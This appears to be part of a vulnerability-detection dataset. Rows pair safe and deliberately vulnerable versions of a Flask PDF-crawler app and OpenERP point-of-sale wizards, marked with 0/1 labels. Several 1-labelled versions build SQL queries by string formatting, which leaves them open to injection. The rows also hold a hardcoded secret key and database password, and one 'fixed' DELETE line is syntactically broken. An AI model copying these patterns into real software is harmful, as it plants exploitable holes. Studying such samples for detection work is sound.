    #TODO https://stackoverflow.com/questions/15041620/how-to-continuously-display-python-output-in-a-webpage

    # STEP 2: Execute command in subdirectory
    process = subprocess.Popen(command, cwd=WGET_DATA_PATH)
    session['crawl_process_id'] = process.pid

    return render_template('crawling.html', max_crawling_duration=MAX_CRAWLING_DURATION)


# End Crawling Manual
@app.route('/crawling/end')
@is_logged_in
def end_crawling():

    # STEP 1: Kill crawl process
    p_id = session.get('crawl_process_id', None)
    os.kill(p_id, signal.SIGTERM)

    session['crawl_process_id'] = -1

    # STEP 2: TimeKeeping
    crawl_start_time = session.get('crawl_start_time', None)
    session['crawl_total_time'] = time.time() - crawl_start_time

    # STEP 3: Successful interruption
    flash('You successfully interrupted the crawler', 'success')

    return render_template('end_crawling.html')


# End Crawling Automatic
@app.route('/crawling/autoend')
@is_logged_in
def autoend_crawling():

    # STEP 0: Check if already interrupted
    p_id = session.get('crawl_process_id', None)
    if p_id < 0:
        return ""process already killed""
    else:
        # STEP 1: Kill crawl process
        os.kill(p_id, signal.SIGTERM)

        # STEP 2: TimeKeeping
        crawl_start_time = session.get('crawl_start_time', None)
        session['crawl_total_time'] = time.time() - crawl_start_time

        # STEP 3: Successful interruption
        flash('Time Limit reached - Crawler interrupted automatically', 'success')

        return redirect(url_for(""table_detection""))


# Start table detection
@app.route('/table_detection')
@is_logged_in
def table_detection():
    return render_template('table_detection.html', wait=WAIT_AFTER_CRAWLING)


# About
@app.route('/about')
def about():
    return render_template('about.html')


# PDF processing
@app.route('/processing')
@is_logged_in
def processing():

    # STEP 0: Time keeping
    proc_start_time = time.time()

    domain = session.get('domain', None)
    if domain == None:
        pass
        # TODO think of bad cases

    path = ""data/%s"" % (domain,)

    # STEP 1: Call Helper function to create Json string

    # FIXME workaround to weird file system bug with latin/ cp1252 encoding..
    # https://stackoverflow.com/questions/35959580/non-ascii-file-name-issue-with-os-walk works
    # https://stackoverflow.com/questions/2004137/unicodeencodeerror-on-joining-file-name doesn't work
    hierarchy_dict = path_dict(path)  # adding ur does not work as expected either
    hierarchy_json = json.dumps(hierarchy_dict, sort_keys=True, indent=4)  # , encoding='cp1252' not needed in python3

    # FIXME remove all session stores

    # STEP 2: Call helper function to count number of pdf files
    n_files = path_number_of_files(path)
    session['n_files'] = n_files

    # STEP 3: Extract tables from pdf's
    stats, n_error, n_success = pdf_stats(path, PDF_TO_PROCESS)

    # STEP 4: Save stats
    session['n_error'] = n_error
    session['n_success'] = n_success
    stats_json = json.dumps(stats, sort_keys=True, indent=4)
    session['stats'] = stats_json

    # STEP 5: Time Keeping
    proc_over_time = time.time()
    proc_total_time = proc_over_time - proc_start_time

    # STEP 6: Save query in DB
    # Create cursor
    cur = mysql.connection.cursor()

    # Execute query
    cur.execute(""""""INSERT INTO Crawls(cid, crawl_date, pdf_crawled, pdf_processed, process_errors, domain, url, hierarchy, 
                stats, crawl_total_time, proc_total_time) VALUES(NULL, NULL, %s ,%s, %s, %s, %s, %s, %s, %s, %s)"""""",
                (n_files, n_success, n_error, domain, session.get('url', None), hierarchy_json,
                stats_json, session.get('crawl_total_time', None), proc_total_time))

    # Commit to DB
    mysql.connection.commit()

    # Close connection
    cur.close()

    return render_template('processing.html', n_files=n_success, domain=domain, cid=0)

# Last Crawl Statistics
@app.route('/statistics')
@is_logged_in
def statistics():
    # Create cursor
    cur = mysql.connection.cursor()

    # Get user by username
    cur.execute(""""""SELECT cid FROM Crawls WHERE crawl_date = (SELECT max(crawl_date) FROM Crawls)"""""")

    result = cur.fetchone()

    # Close connection
    cur.close()

    if result:
        cid_last_crawl = result[""cid""]
        return redirect(url_for(""cid_statistics"", cid=cid_last_crawl))
    else:
        flash(""There are no statistics to display, please start a new query and wait for it to complete."", ""danger"")
        return redirect(url_for(""index""))


# CID specific Statistics
@app.route('/statistics/<int:cid>')
@is_logged_in
def cid_statistics(cid):

    # STEP 1: retrieve all saved stats from DB
    # Create cursor
    cur = mysql.connection.cursor()

    result = cur.execute(""""""SELECT * FROM Crawls WHERE cid = %s"""""", (cid,))
    crawl = cur.fetchall()[0]

    # Close connection
    cur.close();

    print(session.get('stats', None))
    print(crawl['stats'])

    # STEP 2: do some processing to retrieve interesting info from stats
    json_stats = json.loads(crawl['stats'])
    json_hierarchy = json.loads(crawl['hierarchy'])

    stats_items = json_stats.items()
    n_tables = sum([subdict['n_tables_pages'] for filename, subdict in stats_items])
    n_rows = sum([subdict['n_table_rows'] for filename, subdict in stats_items])

    medium_tables = sum([subdict['table_sizes']['medium'] for filename, subdict in stats_items])
    small_tables = sum([subdict['table_sizes']['small'] for filename, subdict in stats_items])
    large_tables = sum([subdict['table_sizes']['large'] for filename, subdict in stats_items])

    # Find some stats about creation dates
    creation_dates_pdf = [subdict['creation_date'] for filename, subdict in stats_items]
    creation_dates = list(map(lambda str : pdf_date_format_to_datetime(str), creation_dates_pdf))

    if len(creation_dates) > 0:
        oldest_pdf = min(creation_dates)
        most_recent_pdf = max(creation_dates)
    else:
        oldest_pdf = ""None""
        most_recent_pdf = ""None""

    return render_template('statistics.html', n_files=crawl['pdf_crawled'], n_success=crawl['pdf_processed'],
                           n_tables=n_tables, n_rows=n_rows, n_errors=crawl['process_errors'], domain=crawl['domain'],
                           small_tables=small_tables, medium_tables=medium_tables,
                           large_tables=large_tables, stats=json_stats, hierarchy=json_hierarchy,
                           end_time=crawl['crawl_date'], crawl_total_time=round(crawl['crawl_total_time'] / 60.0, 1),
                           proc_total_time=round(crawl['proc_total_time'] / 60.0, 1),
                           oldest_pdf=oldest_pdf, most_recent_pdf=most_recent_pdf)


class RegisterForm(Form):
    name = StringField('Name', [validators.Length(min=1, max=50)])
    username = StringField('Username', [validators.Length(min=4, max=25)])
    email = StringField('Email', [validators.Length(min=6, max=50)])
    password = PasswordField('Password', [validators.DataRequired(),
                                          validators.EqualTo('confirm', message='Passwords do not match')])
    confirm = PasswordField('Confirm Password')


# Register
@app.route('/register', methods=['GET', 'POST'])
def register():
    form = RegisterForm(request.form)
    if request.method == 'POST' and form.validate():
        name = form.name.data
        email = form.email.data
        username = form.username.data
        password = sha256_crypt.encrypt(str(form.password.data))

        # Create cursor
        cur = mysql.connection.cursor()

        # Execute query
        cur.execute(""INSERT INTO Users(name, email, username, password) VALUES(%s, %s, %s, %s)"",
                    (name, email, username, password))

        # Commit to DB
        mysql.connection.commit()

        # Close connection
        cur.close()

        flash('You are now registered and can log in', 'success')

        return redirect(url_for('login'))

    return render_template('register.html', form=form)


# User login
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Get Form Fields
        username = request.form['username']
        password_candidate = request.form['password']

        # Create cursor
        cur = mysql.connection.cursor()

        # Get user by username
        result = cur.execute(""""""SELECT * FROM Users WHERE username = %s"""""", [username])

        # Note: apparently this is safe from SQL injections see
        # https://stackoverflow.com/questions/7929364/python-best-practice-and-securest-to-connect-to-mysql-and-execute-queries/7929438#7929438

        if result > 0:
            # Get stored hash
            data = cur.fetchone() # FIXME why is username not primary key
            password = data['password']

            # Compare passwords
            if sha256_crypt.verify(password_candidate, password): # FIXME how does sha256 work?

                # Check was successful -> create session variables
                session['logged_in'] = True
                session['username'] = username

                flash('You are now logged in', 'success')
                return redirect(url_for('index'))
            else:
                error = 'Invalid login'
                return render_template('login.html', error=error)

        else:
            error = 'Username not found'
            return render_template('login.html', error=error)

        # Close connection
        cur.close() # FIXME shouldn't that happen before return?

    return render_template('login.html')


# Delete Crawl
@app.route('/delete_crawl', methods=['POST'])
@is_logged_in
def delete_crawl():

        # Get Form Fields
        cid = request.form['cid']

        # Create cursor
        cur = mysql.connection.cursor()

        # Get user by username
        result = cur.execute(""""""DELETE FROM Crawls WHERE cid = %s"""""" (cid,))

        # Commit to DB
        mysql.connection.commit()

        # Close connection
        cur.close()

        # FIXME check if successfull first, return message
        flash('Crawl successfully removed', 'success')

        return redirect(url_for('dashboard'))


# Logout
@app.route('/logout')
@is_logged_in
def logout():
    session.clear()
    flash('You are now logged out', 'success')
    return redirect(url_for('login'))


# Dashboard
@app.route('/dashboard')
@is_logged_in
def dashboard():

    # Create cursor
    cur = mysql.connection.cursor()

    # Get Crawls
    result = cur.execute(""""""SELECT cid, crawl_date, pdf_crawled, pdf_processed, domain, url FROM Crawls"""""")

    crawls = cur.fetchall()

    if result > 0:
        return render_template('dashboard.html', crawls=crawls)
    else:
        msg = 'No Crawls Found'
        return render_template('dashboard.html', msg=msg)

    # Close connection FIXME is this code executed
    cur.close()


if __name__ == '__main__':
    app.secret_key='Aj""$7PE#>3AC6W]`STXYLz*[G\gQWA'
    app.run(debug=True)
    #app.run(host='0.0.0.0')

/n/n/n",0
91,91,4bad3673debf0b9491b520f0e22e9186af78c375,"/bar.py/n/nimport subprocess
import shlex
import os
import signal
from helper import path_dict, path_number_of_files, pdf_stats, pdf_date_format_to_datetime
import json
from functools import wraps
from urllib.parse import urlparse

from flask import Flask, render_template, flash, redirect, url_for, session, request, logging
from flask_mysqldb import MySQL
from wtforms import Form, StringField, TextAreaField, PasswordField, validators
from passlib.hash import sha256_crypt
import time

app = Flask(__name__)
app.secret_key = 'Aj""$7PE#>3AC6W]`STXYLz*[G\gQWA'


# Config MySQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'mountain'
app.config['MYSQL_DB'] = 'bar'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'

# init MySQL
mysql = MySQL(app)

# CONSTANTS
WGET_DATA_PATH = 'data'
PDF_TO_PROCESS = 10
MAX_CRAWLING_DURATION = 60 # 15 minutes
WAIT_AFTER_CRAWLING = 1000


# Helper Function

# Check if user logged in
def is_logged_in(f):
    @wraps(f)
    def wrap(*args, **kwargs):
        if 'logged_in' in session:
            return f(*args, **kwargs)
        else:
            flash('Unauthorized, Please login', 'danger')
            return redirect(url_for('login'))
    return wrap


# Index
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST': #FIXME I didn't handle security yet !! make sure only logged-in people can execute

        # User can type in url
        # The url will then get parsed to extract domain, while the crawler starts at url.

        # Get Form Fields and save
        url = request.form['url']
        parsed = urlparse(url)

        session['domain'] = parsed.netloc
        session['url'] = url

        # TODO use WTForms to get validation

        return redirect(url_for('crawling'))

    return render_template('home.html')


# Crawling
@app.route('/crawling')
@is_logged_in
def crawling():
    # STEP 0: TimeKeeping
    session['crawl_start_time'] = time.time()

    # STEP 1: Prepare WGET command
    url = session.get('url', None)

    command = shlex.split(""timeout %d wget -r -A pdf %s"" % (MAX_CRAWLING_DURATION, url,)) #FIXME timeout remove
    #command = shlex.split(""wget -r -A pdf %s"" % (url,))

    #TODO use celery
    #TODO give feedback how wget is doing

    #TODO https://stackoverflow.com/questions/15041620/how-to-continuously-display-python-output-in-a-webpage

    # STEP 2: Execute command in subdirectory
    process = subprocess.Popen(command, cwd=WGET_DATA_PATH)
    session['crawl_process_id'] = process.pid

    return render_template('crawling.html', max_crawling_duration=MAX_CRAWLING_DURATION)


# End Crawling Manual
@app.route('/crawling/end')
@is_logged_in
def end_crawling():

    # STEP 1: Kill crawl process
    p_id = session.get('crawl_process_id', None)
    os.kill(p_id, signal.SIGTERM)

    session['crawl_process_id'] = -1

    # STEP 2: TimeKeeping
    crawl_start_time = session.get('crawl_start_time', None)
    session['crawl_total_time'] = time.time() - crawl_start_time

    # STEP 3: Successful interruption
    flash('You successfully interrupted the crawler', 'success')

    return render_template('end_crawling.html')


# End Crawling Automatic
@app.route('/crawling/autoend')
@is_logged_in
def autoend_crawling():

    # STEP 0: Check if already interrupted
    p_id = session.get('crawl_process_id', None)
    if p_id < 0:
        return ""process already killed""
    else:
        # STEP 1: Kill crawl process
        os.kill(p_id, signal.SIGTERM)

        # STEP 2: TimeKeeping
        crawl_start_time = session.get('crawl_start_time', None)
        session['crawl_total_time'] = time.time() - crawl_start_time

        # STEP 3: Successful interruption
        flash('Time Limit reached - Crawler interrupted automatically', 'success')

        return redirect(url_for(""table_detection""))


# Start table detection
@app.route('/table_detection')
@is_logged_in
def table_detection():
    return render_template('table_detection.html', wait=WAIT_AFTER_CRAWLING)


# About
@app.route('/about')
def about():
    return render_template('about.html')


# PDF processing
@app.route('/processing')
@is_logged_in
def processing():

    # STEP 0: Time keeping
    proc_start_time = time.time()

    domain = session.get('domain', None)
    if domain == None:
        pass
        # TODO think of bad cases

    path = ""data/%s"" % (domain,)

    # STEP 1: Call Helper function to create Json string

    # FIXME workaround to weird file system bug with latin/ cp1252 encoding..
    # https://stackoverflow.com/questions/35959580/non-ascii-file-name-issue-with-os-walk works
    # https://stackoverflow.com/questions/2004137/unicodeencodeerror-on-joining-file-name doesn't work
    hierarchy_dict = path_dict(path)  # adding ur does not work as expected either
    hierarchy_json = json.dumps(hierarchy_dict, sort_keys=True, indent=4)  # , encoding='cp1252' not needed in python3

    # FIXME remove all session stores

    # STEP 2: Call helper function to count number of pdf files
    n_files = path_number_of_files(path)
    session['n_files'] = n_files

    # STEP 3: Extract tables from pdf's
    stats, n_error, n_success = pdf_stats(path, PDF_TO_PROCESS)

    # STEP 4: Save stats
    session['n_error'] = n_error
    session['n_success'] = n_success
    stats_json = json.dumps(stats, sort_keys=True, indent=4)
    session['stats'] = stats_json

    # STEP 5: Time Keeping
    proc_over_time = time.time()
    proc_total_time = proc_over_time - proc_start_time

    # STEP 6: Save query in DB
    # Create cursor
    cur = mysql.connection.cursor()

    # Execute query
    cur.execute(""INSERT INTO Crawls(cid, crawl_date, pdf_crawled, pdf_processed, process_errors, domain, url, hierarchy, stats, crawl_total_time, proc_total_time) VALUES(NULL, NULL, %s ,%s, %s, %s, %s, %s, %s, %s, %s)"",
                (n_files, n_success, n_error, domain, session.get('url', None), hierarchy_json, stats_json, session.get('crawl_total_time', None), proc_total_time))

    # Commit to DB
    mysql.connection.commit()

    # Close connection
    cur.close()

    return render_template('processing.html', n_files=n_success, domain=domain, cid=0)

# Last Crawl Statistics
@app.route('/statistics')
@is_logged_in
def statistics():
    # Create cursor
    cur = mysql.connection.cursor()

    # Get user by username
    cur.execute(""SELECT cid FROM Crawls WHERE crawl_date = (SELECT max(crawl_date) FROM Crawls)"")

    result = cur.fetchone()

    # Close connection
    cur.close()

    if result:
        cid_last_crawl = result[""cid""]
        return redirect(url_for(""cid_statistics"", cid=cid_last_crawl))
    else:
        flash(""There are no statistics to display, please start a new query and wait for it to complete."", ""danger"")
        return redirect(url_for(""index""))


# CID specific Statistics
@app.route('/statistics/<int:cid>')
@is_logged_in
def cid_statistics(cid):

    # STEP 1: retrieve all saved stats from DB
    # Create cursor
    cur = mysql.connection.cursor()

    result = cur.execute('SELECT * FROM Crawls WHERE cid = %s' % cid)
    crawl = cur.fetchall()[0]

    # Close connection
    cur.close();

    print(session.get('stats', None))
    print(crawl['stats'])

    # STEP 2: do some processing to retrieve interesting info from stats
    json_stats = json.loads(crawl['stats'])
    json_hierarchy = json.loads(crawl['hierarchy'])

    stats_items = json_stats.items()
    n_tables = sum([subdict['n_tables_pages'] for filename, subdict in stats_items])
    n_rows = sum([subdict['n_table_rows'] for filename, subdict in stats_items])

    medium_tables = sum([subdict['table_sizes']['medium'] for filename, subdict in stats_items])
    small_tables = sum([subdict['table_sizes']['small'] for filename, subdict in stats_items])
    large_tables = sum([subdict['table_sizes']['large'] for filename, subdict in stats_items])

    # Find some stats about creation dates
    creation_dates_pdf = [subdict['creation_date'] for filename, subdict in stats_items]
    creation_dates = list(map(lambda str : pdf_date_format_to_datetime(str), creation_dates_pdf))

    if len(creation_dates) > 0:
        oldest_pdf = min(creation_dates)
        most_recent_pdf = max(creation_dates)
    else:
        oldest_pdf = ""None""
        most_recent_pdf = ""None""

    return render_template('statistics.html', n_files=crawl['pdf_crawled'], n_success=crawl['pdf_processed'],
                           n_tables=n_tables, n_rows=n_rows, n_errors=crawl['process_errors'], domain=crawl['domain'],
                           small_tables=small_tables, medium_tables=medium_tables,
                           large_tables=large_tables, stats=json_stats, hierarchy=json_hierarchy,
                           end_time=crawl['crawl_date'], crawl_total_time=round(crawl['crawl_total_time'] / 60.0, 1),
                           proc_total_time=round(crawl['proc_total_time'] / 60.0, 1),
                           oldest_pdf=oldest_pdf, most_recent_pdf=most_recent_pdf)


class RegisterForm(Form):
    name = StringField('Name', [validators.Length(min=1, max=50)])
    username = StringField('Username', [validators.Length(min=4, max=25)])
    email = StringField('Email', [validators.Length(min=6, max=50)])
    password = PasswordField('Password', [validators.DataRequired(),
                                          validators.EqualTo('confirm', message='Passwords do not match')])
    confirm = PasswordField('Confirm Password')


# Register
@app.route('/register', methods=['GET', 'POST'])
def register():
    form = RegisterForm(request.form)
    if request.method == 'POST' and form.validate():
        name = form.name.data
        email = form.email.data
        username = form.username.data
        password = sha256_crypt.encrypt(str(form.password.data))

        # Create cursor
        cur = mysql.connection.cursor()

        # Execute query
        cur.execute(""INSERT INTO Users(name, email, username, password) VALUES(%s, %s, %s, %s)"",
                    (name, email, username, password))

        # Commit to DB
        mysql.connection.commit()

        # Close connection
        cur.close()

        flash('You are now registered and can log in', 'success')

        return redirect(url_for('login'))

    return render_template('register.html', form=form)


# User login
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Get Form Fields
        username = request.form['username'] # FIXME SQL_injection danger?
        password_candidate = request.form['password']

        # Create cursor
        cur = mysql.connection.cursor()

        # Get user by username
        result = cur.execute(""SELECT * FROM Users WHERE username = %s"", [username])

        if result > 0:
            # Get stored hash
            data = cur.fetchone() # FIXME fucking stupid username is not primary key
            password = data['password']

            # Compare passwords
            if sha256_crypt.verify(password_candidate, password): # FIXME how does sha256 work?

                # Check was successful -> create session variables
                session['logged_in'] = True
                session['username'] = username

                flash('You are now logged in', 'success')
                return redirect(url_for('index'))
            else:
                error = 'Invalid login'
                return render_template('login.html', error=error)

        else:
            error = 'Username not found'
            return render_template('login.html', error=error)

        # Close connection
        cur.close() # FIXME shouldn't that happen before return?

    return render_template('login.html')


# Delete Crawl
@app.route('/delete_crawl', methods=['POST'])
@is_logged_in
def delete_crawl():

        # Get Form Fields
        cid = request.form['cid']

        # Create cursor
        cur = mysql.connection.cursor()

        # Get user by username
        result = cur.execute(""DELETE FROM Crawls WHERE cid = %s"" % cid)

        # Commit to DB
        mysql.connection.commit()

        # Close connection
        cur.close()

        # FIXME check if successfull first, return message
        flash('Crawl successfully removed', 'success')

        return redirect(url_for('dashboard'))


# Logout
@app.route('/logout')
@is_logged_in
def logout():
    session.clear()
    flash('You are now logged out', 'success')
    return redirect(url_for('login'))


# Dashboard
@app.route('/dashboard')
@is_logged_in
def dashboard():

    # Create cursor
    cur = mysql.connection.cursor()

    # Get Crawls
    result = cur.execute(""SELECT cid, crawl_date, pdf_crawled, pdf_processed, domain, url FROM Crawls"")

    crawls = cur.fetchall()

    if result > 0:
        return render_template('dashboard.html', crawls=crawls)
    else:
        msg = 'No Crawls Found'
        return render_template('dashboard.html', msg=msg)

    # Close connection FIXME is this code executed
    cur.close()


if __name__ == '__main__':
    app.secret_key='Aj""$7PE#>3AC6W]`STXYLz*[G\gQWA'
    app.run(debug=True)
    #app.run(host='0.0.0.0')

/n/n/n",1
42,42,b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c,"addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """"""
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """"""
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute(""""""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id""""""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': ""[('id','in',"" + str(list_statement) + "")]"",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:
/n/n/naddons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """"""
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """"""
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute(""""""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id""""""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for ""%s"". \n Please close the cashbox related to. ' %(journal.name)))
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
            'domain': ""[('state','=','open')]"",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:
/n/n/n",0
43,43,b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c,"/addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """"""
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """"""
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute(""""""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id""""""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute("""""" select id from account_journal
                            where auto_cash='True' and type='cash'
                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))
        journal_ids = map(lambda x1: x1[0], cr.fetchall())

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)
    #        if not list_statement:
    #            return {}
    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)
    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': ""[('id','in',"" + str(list_statement) + "")]"",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:
/n/n/n/addons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """"""
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """"""
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute(""""""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id""""""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute("""""" select id from account_journal
                            where auto_cash='True' and type='cash'
                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))
        journal_ids = map(lambda x1: x1[0], cr.fetchall())

        for journal in journal_obj.browse(cr, uid, journal_ids):
